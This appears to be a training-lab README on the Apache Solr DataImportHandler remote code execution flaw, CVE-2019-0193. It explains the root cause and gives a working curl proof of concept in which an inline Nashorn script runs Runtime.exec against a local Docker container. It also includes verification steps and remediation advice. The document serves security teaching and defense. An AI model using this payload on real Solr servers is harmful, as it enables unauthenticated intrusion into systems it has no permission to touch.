# Apache Solr DataImportHandler ScriptTransformer Remote Code Execution (CVE-2019-0193)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Apache Solr DataImportHandler ScriptTransformer Remote Code Execution (CVE-2019-0193)**.

- **Target Directory**: `Classes/02_web_penetration_tester/11_ssti_template_injection/solr_dataimport_rce`
- **Default Port(s)**: `8216:8983`
- **CLI Shortcut**: `./lab start solr-dataimport-rce`

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_solr_dataimport`
- **Upstream Image**: `vulhub/solr:8.1.1`
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

Apache Solr DataImportHandler (DIH) is an optional module for importing structured data from external databases, XML/JSON documents, or flat files. Prior to Solr 8.2.0, the DataImportHandler allowed passing arbitrary inline XML configurations using the `dataConfig` HTTP POST parameter.

### Technical Root Cause & ScriptTransformer Vulnerability

When processing `dataConfig`, Solr parses document specifications, entity processors, and custom transformer scripts. Solr's `ScriptTransformer` allows users to declare inline script blocks (`<script>...</script>`) executed by the embedded Java Nashorn script engine during data ingestion.

Because the `dataConfig` parameter was unauthenticated and dynamically evaluated:

1. An attacker sends a `dataConfig` XML payload declaring a `<script>` tag that executes arbitrary Java APIs (e.g. `java.lang.Runtime.getRuntime().exec(...)`).
2. An `<entity>` definition specifies `processor="FileListEntityProcessor"` and `transformer="script:<func_name>"`.
3. When `command=full-import` is executed, the Nashorn JavaScript engine triggers the callback function, resulting in unauthenticated Remote Code Execution in the context of the Solr process.

---

## Reproduction & Verification Commands

### 1. Check System and Core Status

Verify the Apache Solr instance and available core:

```bash
# Check system information
curl -s http://localhost:8216/solr/admin/info/system

# Check available core name (defaults to 'demo')
curl -s "http://localhost:8216/solr/admin/cores?action=STATUS"
```

### 2. Verify DataImportHandler Status

Check the dataimport endpoint for the `demo` core:

```bash
curl -s "http://localhost:8216/solr/demo/dataimport"
```

**Expected Response:**

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 2
  },
  "initArgs": ["defaults", ["config", "db-data-config.xml"]],
  "status": "idle",
  "importResponse": "",
  "statusMessages": {}
}
```

### 3. Submit dataConfig Payload via curl

Submit a `dataConfig` payload with an inline script block triggering the DataImportHandler:

```bash
curl -s -X POST "http://localhost:8216/solr/demo/dataimport" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "command=full-import" \
  --data-urlencode "verbose=false" \
  --data-urlencode "clean=false" \
  --data-urlencode "commit=false" \
  --data-urlencode "core=demo" \
  --data-urlencode "name=dataimport" \
  --data-urlencode 'dataConfig=<dataConfig>
  <script><![CDATA[
    function poc(){
      java.lang.Runtime.getRuntime().exec("touch /tmp/success");
    }
  ]]></script>
  <document>
    <entity name="sample"
            fileName=".*"
            baseDir="/"
            processor="FileListEntityProcessor"
            recursive="false"
            transformer="script:poc" />
  </document>
</dataConfig>'
```

**Expected Response:**

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 14
  },
  "initArgs": ["defaults", ["config", "db-data-config.xml"]],
  "command": "full-import",
  "status": "idle",
  "importResponse": "",
  "statusMessages": {}
}
```

Verify that the payload executed inside the container:

```bash
docker exec cyberlab_02_solr_dataimport ls -la /tmp/success
```

---

## Defensive Remediation & Hardening

1. **Upgrade**: Upgrade Apache Solr to version 8.2.0 or newer.
2. **Disable Dynamic dataConfig**: In Solr 8.2.0+, dynamic `dataConfig` evaluation is disabled by default and requires the system property `-Denable.dih.dataConfigParam=true`.
3. **Configuration Hardening**: In legacy versions, define an explicit `<invariants>` section in `solrconfig.xml` under `/dataimport` to lock down or ignore incoming `dataConfig` parameters.
4. **Access Control**: Restrict network access to Solr administration endpoints using reverse proxy authentication, firewall rules, and network segmentation.

---

## Official Advisories & References

- **Vulhub Advisory & Environment**: [Vulhub CVE-2019-0193](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193)
- **Apache Solr Security Advisory**: [Apache Solr Security Releases - CVE-2019-0193](https://solr.apache.org/security.html#cve-2019-0193-remote-code-execution-via-dataimporthandler)
- **Apache Lucene/Solr Mailing List Announcement**: [CVE-2019-0193 Advisory Notice](https://mail-archives.apache.org/mod_mbox/lucene-solr-user/201908.mbox/%3C065801d54be8%2429e5a1b0%247db0e510%24%40apache.org%3E)
- **Apache JIRA Tracking**: [SOLR-13662](https://issues.apache.org/jira/browse/SOLR-13662)

---

## Verified Video Walkthrough

- **Video Title**: [Solr RCE- CVE-2019-0193-Demo](https://www.youtube.com/watch?v=9n90Y6GPmBU)
- **Direct URL**: https://www.youtube.com/watch?v=9n90Y6GPmBU
